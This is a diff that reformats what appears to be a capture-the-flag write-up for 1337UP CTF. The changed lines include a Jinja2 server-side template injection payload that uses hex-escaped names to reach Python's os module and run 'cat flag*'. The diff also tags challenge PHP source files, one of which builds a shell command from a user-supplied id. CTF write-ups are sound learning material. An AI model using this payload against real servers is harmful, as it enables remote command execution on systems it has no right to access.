@@ -498,7 +498,7 @@ list directory contents and get our bearings
 
 Next, we just need to read the flag file and the challenge should be complete.
 
->\{\{request|attr('application')\|attr('\x5f\x5fglobals\x5f\x5f')\|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')\|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')\|attr('popen')('cat%20flag*')\|attr('read')()\}\}
+>\{\{request\|attr('application')\|attr('\x5f\x5fglobals\x5f\x5f')\|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')\|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')\|attr('popen')('cat%20flag*')\|attr('read')()\}\}
 
 [![Flag](/assets/1337UPCTF/1truth3.png)](/assets/1337UPCTF/1truth3.png)
 <figcaption align=center><b>Figure 3.3: Results of the Final Injection in Burp Suite</b></figcaption>
@@ -627,7 +627,7 @@ It appears to be the first flag of this challenge.
 As we saw in the previous part, we can now download some important files. Let's start
 with an easy one: pictures.php
 
-```
+```php
 <?php
     $projectRoot = realpath(__DIR__);
 
@@ -664,7 +664,7 @@ with an easy one: pictures.php
 pictures.php doesn't contain anything more than we already know. Next,
 we can view the contents of cat_info.php
 
-```
+```php
 <?php    
     $kittenID = $_GET['id'];
     $cmd = escapeshellcmd("/var/www/html/cat_info/main -c $kittenID");
